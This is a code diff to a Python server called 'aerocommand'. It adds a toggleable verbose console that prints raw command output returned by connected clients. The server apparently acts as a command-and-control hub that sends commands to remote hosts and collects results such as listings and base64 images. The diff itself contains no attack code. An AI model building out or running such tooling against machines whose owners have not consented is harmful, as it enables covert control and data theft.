@@ -61,6 +61,12 @@ def require_auth(f):
 
 DB_FILE = "aerocommand.db"
 
+# Verbose console: local interactive terminals print full command output for
+# testing; headless/cloud (Render) stays quiet since nobody watches stdout.
+# Toggle anytime with the `verbose on|off` console command.
+VERBOSE_CONSOLE_CAP = 8 * 1024  # max chars printed in verbose mode
+_verbose_console = bool(sys.stdin and sys.stdin.isatty())
+
 # === Operator SSE push hub ===
 # Each connected operator GUI holds one Queue; mutations broadcast events so the
 # console gets instant updates instead of polling /api/logs every 750ms.
@@ -514,10 +520,17 @@ def post_result():
         else:
             host_label = client_id
 
-    # Console stays quiet — raw output (base64 images, big listings) goes to DB/UI only
+    # Console stays quiet by default — raw output (base64 images, big listings)
+    # goes to DB/UI only. Local interactive sessions default to verbose.
     command_name = data.get("command", "COMMAND_RESULT")
-    print(f"{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET} "
-          f"{command_name} ({len(output):,} chars)")
+    if _verbose_console:
+        shown = output[:VERBOSE_CONSOLE_CAP]
+        suffix = f"\n{C.GRAY}[!] Output truncated at {VERBOSE_CONSOLE_CAP // 1024}KB (full result in DB/GUI){C.RESET}" if len(output) > VERBOSE_CONSOLE_CAP else ""
+        print(f"{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET} {command_name}")
+        print(f"{shown}{suffix}")
+    else:
+        print(f"{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET} "
+              f"{command_name} ({len(output):,} chars)")
     results.append({"client": client_id, "output": output, "time": timestamp})
     if len(results) > 500:
         del results[:-500]
@@ -778,6 +791,7 @@ def show_help():
   {C.CYAN}Server & Database:{C.RESET}
   {C.GREEN}db clients{C.RESET}         Show historical registered clients from database
   {C.GREEN}db logs [limit]{C.RESET}    Show command logs stored in database
+  {C.GREEN}verbose [on|off]{C.RESET}   Toggle full raw output printing (default: on locally, off in cloud)
   {C.GREEN}help{C.RESET}              Show this help menu
   {C.GREEN}clear{C.RESET}             Clear screen
   {C.GREEN}exit{C.RESET}              Quit the server 
@@ -879,6 +893,17 @@ def input_thread_func():
 
             elif cmd.lower() == "list":
                 show_clients()
+
+            elif cmd.lower() == "verbose" or cmd.lower().startswith("verbose "):
+                global _verbose_console
+                arg = cmd.split(None, 1)[1].strip().lower() if len(cmd.split(None, 1)) > 1 else ""
+                if arg == "on":
+                    _verbose_console = True
+                elif arg == "off":
+                    _verbose_console = False
+                state = f"{C.GREEN}ON{C.RESET}" if _verbose_console else f"{C.RED}OFF{C.RESET}"
+                print(f"[i] Verbose console: {state} — raw client output "
+                      + ("printed (capped at 8KB)" if _verbose_console else "hidden; DB/GUI only"))
 
             elif cmd.lower() == "db clients":
                 with db_connect() as conn:
